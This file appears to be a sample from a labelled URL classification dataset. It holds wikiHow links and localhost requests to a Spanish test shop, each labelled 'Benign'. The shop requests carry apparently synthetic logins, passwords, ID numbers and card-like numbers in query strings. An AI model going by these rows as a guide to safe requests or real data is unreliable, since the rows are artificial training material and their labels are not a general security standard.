http://www.wikihow.com/find-fellow-tweeters-with-twellow&t=1396629894821&n=5437945&k=mainentity,Benign
http://www.wikihow.com/use-lemon-to-prevent-fruits-and-vegetables-from-turning-brown&t=1396517558771&n=323587&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kushwaha&pwd=filador&remember=off&b1=entrar,Benign
http://www.wikihow.com/present-your-personal-computer-as-a-usb-host-device-in-order-for-content-to-be-shared&t=1396531700234&n=1031222&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam%f3n+ib%e9rico&precio=39&cantidad=66&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/choose-the-best-amongst-satellite-broadband-internet-providers&t=1396532987491&n=1091968&k=mainentity,Benign
http://www.wikihow.com/reply-to-different-users-on-yahoo!-answers&t=1396630206866&n=5450761&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=cedric&password=aforo&nombre=nayib&apellidos=maurizio&email=clemento%40ingenelec.lc&dni=35944819m&direccion=plza.+vicente+blasco+iba%f1ez%2c+49%2c+5%3fg&ciudad=calomarde&cp=19247&provincia=toledo&ntc=2139911097438297&b1=registrar,Benign
http://www.wikihow.com/get-out-of-the-trojan-horse-before-it-downloads&t=1396526708545&n=797222&k=mainentity,Benign
http://www.wikihow.com/bake-pumpkin-oatmeal-cookies&t=1396594949474&n=3958791&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+rioja&precio=100&cantidad=21&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=janean&password=electropositiva&nombre=belisario&apellidos=juela+alicante&email=stratten%40socimi.com.edu&dni=51900258e&direccion=crisantemo%2c+68+6%3fc&ciudad=pajares+de+adaja&cp=28296&provincia=navarra&ntc=8243813849685178&b1=registrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6073&b1=confirmar,Benign
http://www.wikihow.com/beat-saix-(data-battle)-in-kingdom-hearts-ii&t=1396649057555&n=5989526&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+rioja&precio=85&cantidad=32&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=reidar&password=ervilla&nombre=fidencio&apellidos=cuesta&email=pax%40quierocortinas.il&dni=03020287l&direccion=plaza+de+la+bahia%2c+193+10-g&ciudad=sabadell&cp=03011&provincia=guadalajara&ntc=3030991310977436&b1=registrar,Benign
http://www.wikihow.com/pick-up-a-large-dog&t=1396516709085&n=267536&k=mainentity,Benign
